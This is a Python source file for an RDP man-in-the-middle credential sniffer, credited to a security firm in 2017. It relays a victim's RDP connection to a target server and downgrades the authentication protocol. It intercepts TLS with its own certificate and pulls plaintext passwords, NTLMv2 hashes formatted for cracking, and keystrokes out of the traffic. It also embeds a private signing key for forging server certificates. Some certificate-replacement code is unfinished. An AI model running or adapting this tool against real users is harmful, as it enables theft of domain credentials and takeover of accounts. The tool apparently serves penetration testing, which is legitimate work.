#!/usr/bin/env python3
# TODO win7,8,10, server2012, server 2016 matrix
# TODO find an elegant way to parse binary data
"""
RDP Credential Sniffer
Adrian Vollmer, SySS GmbH 2017
"""
# Refs:
#   https://www.contextis.com/resources/blog/rdp-replay/
#   https://msdn.microsoft.com/en-us/library/cc216517.aspx
# Requirements: python3-rsa

import argparse
import socket
import ssl
import binascii
import re
from hexdump import hexdump
import select
import struct
import time
import rsa


parser = argparse.ArgumentParser(
    description="RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017")
parser.add_argument('-d', '--debug', dest='debug', action="store_true",
    default=False, help="show debug information")
parser.add_argument('-p', '--listen-port', dest='listen_port', type=int,
    default=3389, help="TCP port to listen on (default 3389)")
parser.add_argument('-b', '--bind-ip', dest='bind_ip', type=str, default="",
    help="IP address to bind the fake service to (default all)")
parser.add_argument('-g', '--downgrade', dest='downgrade', type=int,
    default=3, action="store", choices=[0,1,3,11],
    help="downgrade the authentication protocol to this (default 3)")
parser.add_argument('-c', '--certfile', dest='certfile', type=str,
    required=True, help="path to the certificate file")
parser.add_argument('-k', '--keyfile', dest='keyfile', type=str,
    required=True, help="path to the key file")
parser.add_argument('target_host', type=str,
    help="target host of the RDP service")
parser.add_argument('target_port', type=int, default=3389, nargs='?',
    help="TCP port of the target RDP service (default 3389)")

args = parser.parse_args()



TERM_SIGN_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
    "n": [ 0x3d, 0x3a, 0x5e, 0xbd, 0x72, 0x43, 0x3e, 0xc9, 0x4d, 0xbb, 0xc1,
          0x1e, 0x4a, 0xba, 0x5f, 0xcb, 0x3e, 0x88, 0x20, 0x87, 0xef, 0xf5,
          0xc1, 0xe2, 0xd7, 0xb7, 0x6b, 0x9a, 0xf2, 0x52, 0x45, 0x95, 0xce,
          0x63, 0x65, 0x6b, 0x58, 0x3a, 0xfe, 0xef, 0x7c, 0xe7, 0xbf, 0xfe,
          0x3d, 0xf6, 0x5c, 0x7d, 0x6c, 0x5e, 0x06, 0x09, 0x1a, 0xf5, 0x61,
          0xbb, 0x20, 0x93, 0x09, 0x5f, 0x05, 0x6d, 0xea, 0x87 ],
    "d": [ 0x87, 0xa7, 0x19, 0x32, 0xda, 0x11, 0x87, 0x55, 0x58, 0x00, 0x16,
          0x16, 0x25, 0x65, 0x68, 0xf8, 0x24, 0x3e, 0xe6, 0xfa, 0xe9, 0x67,
          0x49, 0x94, 0xcf, 0x92, 0xcc, 0x33, 0x99, 0xe8, 0x08, 0x60, 0x17,
          0x9a, 0x12, 0x9f, 0x24, 0xdd, 0xb1, 0x24, 0x99, 0xc7, 0x3a, 0xb8,
          0x0a, 0x7b, 0x0d, 0xdd, 0x35, 0x07, 0x79, 0x17, 0x0b, 0x51, 0x9b,
          0xb3, 0xc7, 0x10, 0x01, 0x13, 0xe7, 0x3f, 0xf3, 0x5f ],
    "e": [ 0x5b, 0x7b, 0x88, 0xc0 ]
}

def substr(s, offset, count):
    return s[offset:offset+count]


def extract_ntlmv2(bytes, m):
    # References:
    #  - [MS-NLMP].pdf
    #  - https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf
    offset = len(m.group())//2
    keys = ["lmstruct", "ntstruct", "domain", "user", "workstation",
            "encryption_key"]
    fields = [bytes[offset+i*8:offset+(i+1)*8] for i in range(len(keys))]
    field_offsets = [struct.unpack('<I', x[4:])[0] for x in fields]
    field_lens = [struct.unpack('<H', x[:2])[0] for x in fields]
    payload = bytes[offset+76:]

    values = {}
    for i,length in enumerate(field_lens):
        thisoffset = offset - 12 + field_offsets[i]
        values[keys[i]] = bytes[thisoffset:thisoffset+length]

    # TODO check if LM struct is more than just zeros, maybe they're using
    # lmchallenge which is broken

    nt_response = values["ntstruct"][:16]
    jtr_string = values["ntstruct"][16:]

    global server_challenge
    if not 'server_challenge' in globals():
        server_challenge = b"SERVER_CHALLENGE_MISSING"

    return b"%s::%s:%s:%s:%s" % (
                 values["user"],
                 values["domain"],
                 binascii.hexlify(server_challenge),
                 binascii.hexlify(nt_response),
                 binascii.hexlify(jtr_string),
         )


def extract_server_challenge(bytes, m):
    offset = len(m.group())//2+12
    global server_challenge
    server_challenge = bytes[offset:offset+8]
    return b"Server challenge: " + binascii.hexlify(server_challenge)


def extract_server_cert(bytes):
    # Reference: [MS-RDPBCGR].pdf from 2010, v20100305
    m2 = re.match(b".*010c.*030c.*020c", binascii.hexlify(bytes))
    offset = len(m2.group())//2
    size = struct.unpack('<H', substr(bytes, offset, 2))[0]
    encryption_method = struct.unpack('<I', substr(bytes, offset+2, 4))[0]
    encryption_level = struct.unpack('<I', substr(bytes, offset+6, 4))[0]
    server_random_len = struct.unpack('<I', substr(bytes, offset+10, 4))[0]
    server_cert_len = struct.unpack('<I', substr(bytes, offset+14, 4))[0]
    server_random = substr(bytes, offset+16, server_random_len)
    server_cert = substr(bytes, offset+16+server_random_len, server_cert_len)

    #  cert_version = struct.unpack('<I', server_cert[:4])[0]
        # 1 = Proprietary
        # 2 = x509
        # TODO ignore right most bit

    prop_cert_data = server_cert[2:]
    ## wtf, does not follow proto^col, excpected a 4 here
    dwVersion = struct.unpack('<I', substr(prop_cert_data, 0, 4))[0]
    dwSigAlg = struct.unpack('<I', substr(prop_cert_data, 4, 4))[0]
    dwKeyAlg = struct.unpack('<I', substr(prop_cert_data, 8, 4))[0]

    pubkey_type = struct.unpack('<H', substr(prop_cert_data, 12, 2))[0]
    pubkey_len = struct.unpack('<H', substr(prop_cert_data, 14, 2))[0]
    pubkey = substr(prop_cert_data, 16, pubkey_len)
    assert pubkey[:4] == b"RSA1"

    sig_type = struct.unpack('<H', substr(prop_cert_data, 20+pubkey_len, 2))[0]
    sig_len = struct.unpack('<H', substr(prop_cert_data, 22+pubkey_len, 2))[0]
    sig = substr(prop_cert_data, 24+pubkey_len, sig_len)

    key_len = struct.unpack('<I', substr(pubkey, 4, 4))[0]
    bit_len = struct.unpack('<I', substr(pubkey, 8, 4))[0]
    assert bit_len == key_len * 8 - 64
    data_len = struct.unpack('<I', substr(pubkey, 12, 4))[0]
    pub_exp = struct.unpack('<I', substr(pubkey, 16, 4))[0]
    modulus = substr(pubkey, 20, key_len)

    global server_crypto
    server_crypto = {"modulus": modulus,
                     "pub_exponent": pub_exp,
                     "data_len": data_len,
                     "server_rand": server_random, # little endian
                     "sig": sig,
                    }
    server_crypto["pubkey"] = rsa.PublicKey(
        int.from_bytes(modulus, "little"),
        int.from_bytes(pub_exp, "little"),
    )
    #  print(server_crypto)

    return b"Server cert modulus: " + binascii.hexlify(modulus)


def extract_credentials(bytes, m):
#  00000000: 03 00 01 71 02 F0 80 64  00 08 03 EB 70 81 62 40  ...q...d....p.b@
#  00000010: 00 00 00 07 04 07 04 BB  47 01 00 08 00 0A 00 12  ........G.......
#  00000020: 00 00 00 00 00 52 00 44  00 31 00 34 00 00 00 55  .....R.D.1.4...U
#  00000030: 00 73 00 65 00 72 00 31  00 00 00 50 00 61 00 73  .s.e.r.1...P.a.s
#  00000040: 00 73 00 77 00 6F 00 72  00 74 00 31 00 00 00 00  .s.w.o.r.t.1....
#
#  00000000: 03 00 01 7D 02 F0 80 64  00 08 03 EB 70 81 6E 40  ...}...d....p.n@
#  00000010: 00 00 00 00 00 00 00 3B  01 00 00 08 00 12 00 24  .......;.......$
#  00000020: 00 00 00 00 00 72 00 64  00 31 00 34 00 00 00 44  .....r.d.1.4...D
#  00000030: 00 6F 00 6D 00 41 00 64  00 6D 00 69 00 6E 00 31  .o.m.A.d.m.i.n.1
#  00000040: 00 00 00 44 00 6F 00 6D  00 41 00 64 00 6D 00 69  ...D.o.m.A.d.m.i
#  00000050: 00 6E 00 2D 00 50 00 61  00 73 00 73 00 77 00 6F  .n.-.P.a.s.s.w.o
#  00000060: 00 72 00 74 00 31 00 00  00 00 00 00 00 02 00 18  .r.t.1..........
#
#  00000000: 03 00 01 53 02 F0 80 64  00 07 03 EB 70 81 44 40  ...S...d....p.D@
#  00000010: 00 00 00 00 00 00 00 3B  01 00 00 08 00 08 00 08  .......;........
#  00000020: 00 00 00 00 00 74 00 65  00 73 00 74 00 00 00 74  .....t.e.s.t...t
#  00000030: 00 65 00 73 00 74 00 00  00 74 00 65 00 73 00 74  .e.s.t...t.e.s.t
#  00000040: 00 00 00 00 00 00 00 02  00 14 00 31 00 32 00 37  ...........1.2.7
    domlen, userlen, pwlen = [
        struct.unpack('>H', binascii.unhexlify(x))[0]
        for x in m.groups()
    ]
    offset = 36
    domain = bytes[offset:offset+domlen]
    user = bytes[offset+domlen+2:offset+domlen+2+userlen]
    pw = bytes[offset+domlen+2+userlen+2:offset+domlen+2+userlen+2+pwlen]
    return (b"%s\\%s:%s" % (domain, user, pw))


def extract_key_press(bytes):
    event = bytes[-5]
    key = bytes[-4] # TODO map scancode to ascii
    if event == 0:
        return b"Key press:   %d" % key
    elif event == 192:
        return b"Key release: %d" % key


def replace_server_cert(bytes):
    global server_crypto
    global my_keys
    key_len = server_crypto["modulus"]//8 - 8
    (pubkey, privkey) = rsa.newkeys(key_len)
    my_keys = {"pubkey": pubkey, "privkey": privkey}
    term_server_privkey = rsa.PrivateKey(
        int.from_bytes(TERM_SIGN_PRIV_KEY["n"], "little"),
        int.from_bytes(TERM_SIGN_PRIV_KEY["e"], "little"),
        int.from_bytes(TERM_SIGN_PRIV_KEY["d"], "little"),
        # TODO p,q
        # https://crypto.stackexchange.com/questions/11509/computing-p-and-q-from-private-key
    )
    result = re.sub(server_crypto["modulus"],
           pubkey.n.to_bytes(key_len, "little") + b"\x00"*8,
           bytes
          )
    new_sig = sign_my_cert(pubkey, term_server_privkey)
    result = re.sub(server_crypto["sig"], new_sig, bytes)

    return result


def sign_my_cert(pubkey, privkey):
    """Signs the public key with the private key"""
    return ""

def parse_rdp(bytes):

    result = b""
    # hexlify first because \x0a is a line break and regex works on single
    # lines
    cred_regex = b".{16}00..03eb.{6}40.{20}(.{4})(.{4})(.{4})"
    m = re.match(cred_regex, binascii.hexlify(bytes))
    if m:
        result = extract_credentials(bytes, m)
        #  close();exit(0)

    cred_regex = b".*%s0002000000" % binascii.hexlify(b"NTLMSSP")
    m = re.match(cred_regex, binascii.hexlify(bytes))
    if m:
        result = extract_server_challenge(bytes, m)

    cred_regex = b".*%s0003000000" % binascii.hexlify(b"NTLMSSP")
    m = re.match(cred_regex, binascii.hexlify(bytes))
    if m:
        result = extract_ntlmv2(bytes, m)

    cred_regex = b".*020c.*%s" % binascii.hexlify(b"RSA1")
    m = re.match(cred_regex, binascii.hexlify(bytes))
    if m:
        result = extract_server_cert(bytes)

    keypress_regex = b"\x03\x00\x001"
    m = re.match(keypress_regex, bytes)
    if m:
        result = extract_key_press(bytes)

    #  keymap_regex = b".*en-us.*" # TODO find keymap definition
    #  (CLIENT_CORE_DATA)
    #  m = re.match(keymap_regex, bytes)
    #  if m:
    #      result = b"Keymap: " + bytes

    if not result == b"" and not result == None:
        print("\033[31m%s\033[0m" % result.decode())

#  with open("data/server_cert.bytes", 'rb') as f:
#      bytes = f.read()
#  parse_rdp(bytes)
#  exit(1)

def downgrade_auth(bytes):
    cred_regex = b".*..00..00.{8}$"
    m = re.match(cred_regex, binascii.hexlify(bytes))
    global RDP_PROTOCOL
    RDP_PROTOCOL = bytes[-4]
    # Flags:
    # 0: standard rdp security
    # 1: TLS ontop of that
    # 2: CredSSP (NTLMv2 or Kerberos)
    # 8: CredSSP + Early User Authorization
    if m and RDP_PROTOCOL >= args.downgrade:
        RDP_PROTOCOL = args.downgrade
        print("Downgrading authentication options...")
        result = (
            bytes[:-7] +
            b"\x00\x08\x00" +
            chr(RDP_PROTOCOL).encode() +
            b"\x00\x00\x00"
        )
        dump_data(result, From="Client", Modified=True)
        return result
    return bytes


def dump_data(data, From=None, Modified=False):
    if args.debug:
        modified = ""
        if Modified:
            modified = " (modified)"
        if From == "Server":
            print("From server:"+modified)
        elif From == "Client":
            print("From client:"+modified)

        hexdump(data)



def handle_protocol_negotiation():
    data = local_conn.recv(4096)
    dump_data(data, From="Client")
    data = downgrade_auth(data)
    remote_socket.send(data)

    data = remote_socket.recv(4096)
    dump_data(data, From="Server")
    local_conn.send(data)


def enableSSL():
    global local_conn
    global remote_socket
    print("Enable SSL")
    local_conn  = ssl.wrap_socket(
        local_conn,
        server_side=True,
        keyfile=args.keyfile,
        certfile=args.certfile,
    )
    remote_socket = ssl.wrap_socket(remote_socket)


def close():
    if "local_conn" in globals():
        local_conn.close()
    if "remote_conn" in globals():
        remote_socket.close()
    return False


def forward_data():
    readable, _, _ = select.select([local_conn, remote_socket], [], [])
    for s_in in readable:
        if s_in == local_conn:
            data = s_in.recv(4096)
            if len(data)==4096:
                while len(data)%4096 == 0:
                    data += s_in.recv(4096)
            if data == b"": return close()
            dump_data(data, From="Client")
            parse_rdp(data)
            remote_socket.send(data)
        elif s_in == remote_socket:
            data = s_in.recv(4096)
            if len(data)==4096:
                while len(data)%4096 == 0:
                    data += s_in.recv(4096)
            if data == b"": return close()
            dump_data(data, From="Server")
            parse_rdp(data)
            local_conn.send(data)
    return True


def original_dest(s):
    SO_ORIGINAL_DEST = 80
    sockaddr_in = s.getsockopt(socket.SOL_IP, SO_ORIGINAL_DEST, 16)
    (proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
    return "%d.%d.%d.%d:%d" % (a, b, c, d, port)

def open_sockets():
    global local_conn
    global remote_socket
    print("Waiting for connection")
    local_conn, addr = local_socket.accept()
    print("Connection received from " + addr[0])

    #  print(original_dest(local_conn))

    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect((args.target_host, args.target_port))


def run():
    open_sockets()
    handle_protocol_negotiation()
    global RDP_PROTOCOL
    if not RDP_PROTOCOL == 0:
        enableSSL()
    while True:
        try:
            if not forward_data():
                break
        except ssl.SSLError as e :
            print("SSLError: %s" % str(e))


local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_socket.bind((args.bind_ip, args.listen_port))
local_socket.listen()

try:
    while True:
        run()
except KeyboardInterrupt:
    pass
#  except Exception as e:
#      print(str(e))
finally:
    local_socket.close()
    close()
